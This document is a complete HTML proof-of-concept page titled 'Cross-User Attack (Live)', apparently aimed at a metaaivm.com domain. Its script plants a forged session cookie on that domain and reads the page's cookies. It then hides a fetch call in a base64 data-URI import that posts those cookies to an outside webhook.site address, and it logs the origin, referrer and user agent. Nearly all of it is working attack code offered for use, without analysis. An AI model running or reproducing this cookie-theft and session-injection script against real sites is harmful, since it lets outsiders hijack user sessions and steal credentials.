<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prueba Cross-User Real + Consola</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #00ff00; }
        h1 { color: #fff; }
        #console { background: #000; padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; border: 1px solid #333; min-height: 200px; }
        .success { color: #00ff00; font-weight: bold; }
        .error { color: #ff0000; }
        .info { color: #ffff00; }
    </style>
</head>
<body>
    <h1>Cross-User Attack (Live)</h1>
    <div id="console">Iniciando ataque...</div>

    <script>
        const consola = document.getElementById('console');
        const webhookUrl = "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde";

        function log(msg, className) {
            const line = document.createElement('div');
            line.className = className || '';
            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consola.appendChild(line);
            consola.scrollTop = consola.scrollHeight;
        }

        log("Iniciando ataque Cross-User...", "info");

        // 1. INYECCIÓN DE COOKIE
        try {
            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
            log("✅ Cookie inyectada en .metaaivm.com.", "success");
        } catch (e) {
            log("❌ Error al inyectar cookie: " + e.message, "error");
        }

        // 2. LECTURA DE COOKIES
        const victimCookies = document.cookie;
        log("Cookies actuales en document.cookie: " + (victimCookies || "(vacío)"), "info");

        // 3. EXFILTRACIÓN VÍA DATA URI
        log("Preparando exfiltración vía Data URI...", "info");
        
        try {
            const exfilPayload = `
                try {
                    fetch('${webhookUrl}?cross_user=true', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: 'Cookies: ' + document.cookie
                    });
                } catch(e) {}
            `;
            
            const base64Payload = btoa(unescape(encodeURIComponent(exfilPayload)));
            import("data:text/javascript;base64," + base64Payload)
                .then(() => log("✅ Exfiltración enviada al webhook.", "success"))
                .catch((e) => log("❌ Error en exfiltración: " + e.message, "error"));

        } catch (e) {
            log("❌ Error al preparar exfiltración: " + e.message, "error");
        }

        // 4. MOSTRAR ENTORNO
        log("Entorno: Origen = " + window.location.origin, "info");
        log("Entorno: Referrer = " + (document.referrer || "(vacío)"), "info");
        log("Entorno: User-Agent = " + navigator.userAgent, "info");
    </script>
</body>
</html>
